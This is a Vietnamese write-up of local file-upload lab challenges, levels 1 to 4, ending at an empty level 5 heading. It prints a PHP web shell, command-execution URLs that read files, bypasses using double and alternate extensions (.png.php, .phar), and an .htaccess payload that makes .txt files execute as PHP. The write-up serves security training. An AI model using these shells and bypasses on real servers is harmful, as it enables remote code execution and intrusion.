
# Write-Up File Upload level 1-6: Goal: RCE

## Level 1:

Khởi động docker sau đó truy cập http://localhost:12001 để bắt đầu thực hành level 1.

<img width="715" alt="Ảnh chụp Màn hình 2024-10-28 lúc 00 46 57" src="https://github.com/user-attachments/assets/153488cd-6aef-498f-826a-7906f3afdbc5">

Tiến hành upload 1 file ```.php``` với nội dung ```<?php phpinfo(); ?>``` để kiểm tra xem server có chặn các file gây hại hay không.

<img width="709" alt="Ảnh chụp Màn hình 2024-10-28 lúc 00 59 19" src="https://github.com/user-attachments/assets/b8223784-c541-4869-80ea-a43672721937">

Ta thấy Successfully uploaded có nghĩa server hiện tại không hề chặn các file ```.php```. Truy cập vào đường dẫn, nơi lưu trữ file để xem server có "chế biến" file ```.php``` hay không.

<img width="700" alt="Ảnh chụp Màn hình 2024-10-28 lúc 00 59 31" src="https://github.com/user-attachments/assets/daa38e93-f7e0-4aa9-b008-414b202a2cd8">

Như đã thấy, server đã hiển thị nôi dung của ```phpinfo()```. Để RCE, ta tiến hành upload 1 web shell với nội dung ```<?php system($_GET['cmd']); ?>```. Sau khi upload thành công file shell vừa tạo, ta truy cập vào đường dẫn lưu trữ file kèm theo payload sau: ```?cmd=ls /``` Để có thể đọc được các file trong thư mục root.

<img width="786" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 01 16" src="https://github.com/user-attachments/assets/0cd9c407-cf22-4a99-be85-2ea9948060cc">

Lúc này có thể thấy ta có thể xem được bất kì file nào. Thay đổi ```?cmd=cat /secret.txt``` để đọc flag.

<img width="999" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 01 05" src="https://github.com/user-attachments/assets/62a96cd2-5a45-4bce-b250-f4824de8003f">

Thành công RCE level 1 và lấy được flag.

## Level 2:

Truy cập http://localhost:12002 để bắt đầu level 2.

<img width="1440" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 01 29" src="https://github.com/user-attachments/assets/036b400c-b429-4d70-857e-4b662bcf55cb">

Tương tự level 1, ta thử upload 1 file ```.php``` với nội dung ```phpinfo()``` để kiểm tra xem có thể upload được file ```.php``` hay không.

<img width="563" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 01 43" src="https://github.com/user-attachments/assets/89bc7d7c-09f8-46fc-bfd0-8b2a1ef13fc0">

Kết quả là không thành công, có vẻ như anh dev đã bắt đầu ngăn chặn các file độc hại. Lúc này ta sẽ xem source code để xem anh dev đã làm gì.

<img width="1051" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 02 39" src="https://github.com/user-attachments/assets/3f78078e-38b7-4734-8674-06d1c43c6541">

Chú ý đến dòng 19 và 20, ta thấy đoạn code đang kiểm tra phần tử đầu tiên sau dấu chấm. Nếu là ```php``` thì lập tức kết thúc chương trình và hiển thị "Hack detected".

Lúc này có 2 giả thuyết được đặt ra là sẽ ra sao nếu ta đặt tên file ```info.abc.php```(abc là đuôi file bất kì) vì đoạn code trên chỉ kiểm tra phần tử đâu tiên sau dấu chấm. Hoặc là ngoài ```.php``` ra thì ```mod-php``` có xử lý đuôi file nào khác tương tự ```php``` hay không.

Thực hiện giả thuyết đầu tiên, truy cập vào Burp Suite, vào ```Proxy```, chọn gói tin có method là ```POST```, chuột phải và chọn ```Send to Repeater```. 

<img width="1439" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 06 11" src="https://github.com/user-attachments/assets/d5fad70f-fa6d-42c1-b22c-96b149f579ab">

Sau đó thay đổi đuôi file thành ```info.png.php``` và Send.

<img width="1440" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 12 04" src="https://github.com/user-attachments/assets/296c6091-ce68-48c2-a815-faa2e66ada58">

Ở phía ```Response``` ta thấy Successfully uploaded file, nghĩa là ta đã vượt qua được bộ lọc mà anh dev đã đặt ra, truy cập vào đường dẫn file vừa tạo để xem server có trả về nội dung ```phpinfo()``` hay không.

<img width="1440" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 12 17" src="https://github.com/user-attachments/assets/6cc463cf-c1f6-4a9d-b9a2-8d1d60be60ff">

Như ta thấy server đã trả về nội dung của ```phpinfo()```, như vậy là giả thuyết 1 thành công. Bây giờ ta có thể upload 1 file shell để RCE.

## Level 3:

Truy cập vào http://localhost:12003 để bắt đầu level 3.

Chắn chắn anh dev đã nâng cấp bộ lọc của mình ta không cần thử các file của level trước, tra vào xem source code xem anh dev đã thay đổi những gì.

<img width="1141" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 08 46" src="https://github.com/user-attachments/assets/05c46437-4670-4347-abec-5440b912a11d">

Nhìn bằng mắt thường ta sẽ thấy không khác gì so với level trước nên hãy để VS Code so sánh xem đoạn code ở level 3 có khác gì so với level 2 hay không.

Đầu tiên chọn file ```index.php``` của level 3, chuột phải chọn ```Select for Compare```.

<img width="394" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 09 03" src="https://github.com/user-attachments/assets/6d031055-df9d-4778-9eb3-b75f225118ec">

Sau đó chuột phải vào file ```index.php``` của level 2, chọn ```Compare with Selected```.

<img width="451" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 09 23" src="https://github.com/user-attachments/assets/111d491f-3396-4903-b307-7fb2e7653297">

Ta sẽ thấy được thay đổi nhỏ ở level 3.

<img width="1154" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 09 45" src="https://github.com/user-attachments/assets/30eb9b74-062f-432f-81b9-8e085adaaf6c">

Nhìn vào dòng 19, ta thấy lúc này anh dev đã chọn lấy phần tử cuối cùng sau dấu chấm chứ không còn là phần tử đầu tiên. Vậy có cách nào để vượt qua được bộ lọc trên.

Lúc này ta sẽ nghĩ đến giả thuyết 2 mà ta đã đặt ra ở level 2 là liệu ngoài ```.php``` thì ```mod-php``` có xử lý file nào khác tương tự như ```php``` hay không. Nếu có thì làm sao tìm ra mấy cái đuôi đó đây? Config nào? Hay chỗ nào quy định điều đó?


Trong httpd Apache2, có một loại file cấu hình đặc biệt để quyết định rặng loại file nào ```Apache2``` đưa cho ```mod-php``` xử lý. Đó là ```Apache2 config file ```

<img width="678" alt="Ảnh chụp Màn hình 2024-10-28 lúc 02 59 37" src="https://github.com/user-attachments/assets/ba3227a5-42c2-4b4c-8eee-043b99624158">

Giải thích nhanh gọn, trong file cấu hình xuất hiện 2 directive (tạm dịch là hành động): 

- FilesMatch apply một biểu thức chính quy match với các filename cụ thể thì sẽ thực hiện các hành động (directive) tiếp theo.
- SetHandler gán một handler cụ thể để xử lý các files. Trong trường hợp này, chính là mod-php (application/x-httpd-php)

=> Bất kì file nào có đuôi là ```phar | php | phtml ``` sẽ được ```mod-php``` xử lý.

Để khai thác level này ta chỉ cần đổi đuôi file thành ```.phar | phtml ``` là có thể RCE. Để thử nghiệm, ta sẽ up load 1 file có đuôi file là ```.phar``` với nội dung là ```phpinfo()```

<img width="1426" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 13 50" src="https://github.com/user-attachments/assets/34a46782-0b94-4bbf-90df-c098b9499ae8">

Ta thấy Successfully uploaded file ở bên Response như vậy là thành công, truy cập vào đường dẫn file vừa up và server đẫ trả về nội dung ```phpinfo()```

<img width="1440" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 14 09" src="https://github.com/user-attachments/assets/5d786089-cc2a-45cf-9c42-603955a50fd3">

## Level 4:

<img width="1172" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 14 35" src="https://github.com/user-attachments/assets/00884fad-efa1-4e12-9633-c846badfc57f">

Ở level 4, ta thấy anh dev đã chặn các file có đuôi ```php```,```phtml```,```.phar```. Có vẻ như việc thay đổi đuôi file không còn có tác dụng ở level này. Nhìn lại 3 level trước, ta đều tận dụng hành vi có sẵn của ```Apache2``` và code của anh dev. Vậy có cách nào tiếp cận mà không cần điều kiện trên hay không.

Tại sao ta không tự tạo ra hay thậm chí là thao túng hành vi của Apache. Ở level trước ta biết được rằng ```apache2 config file```sẽ quyết định hành vi của ```apache```. Sau khi tìm hiểu thì ```.htaccess``` là 1 file config được phân bổ ở các thư mục. Chỉ có hiệu lực cục bộ/local ở folder đang chứa nó và các thư mục con.

Truy cập vào file ```apache2.conf```

<img width="1172" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 16 00" src="https://github.com/user-attachments/assets/258f2528-a9c5-4ef1-bea8-56c65edc0319">

Ở dòng 38, ta thấy cho phép upload file ```.htaccess```. Sẽ ra sao nếu ta upload file ```.htaccess``` để tuỳ ý set handler cho filename có đuôi tuỳ ý theo ta muốn.

Ta bắt đầu exploit level này, ta dùng Burp Suite để upload file ```.htaccess``` với nội dung ```<FilesMatch ".+\.txt$"> SetHandler application/x-httpd-php </FilesMatch>```. Điều này sẽ cho phép các file ```.txt``` được xử lý như file ```php```. 

<img width="1398" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 16 56" src="https://github.com/user-attachments/assets/eb968f9d-ac2c-45b8-b62e-7ee6de056e35">

Sau khi upload thành công, ta upload file ```info.txt``` với nội dung ``` <?php phpinfo(); ?>``` để xem những giả thuyết nãy giờ ta nghĩ có thực hiện được hay không.

<img width="1440" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 17 56" src="https://github.com/user-attachments/assets/1b63f8b0-d1e7-4d42-877e-7aeb16159e87">

Truy cập vào đường dẫn file vừa upload, ta sẽ thấy server đã trả về nội dung của ```phpinfo()```

<img width="1440" alt="Ảnh chụp Màn hình 2024-10-28 lúc 01 18 21" src="https://github.com/user-attachments/assets/c83ee0ff-6a8f-423e-a9ef-11205347f7fe">

Bây giờ có thể upload 1 file shell với đuôi là ```.txt``` và có thể RCE.

## Level 5:

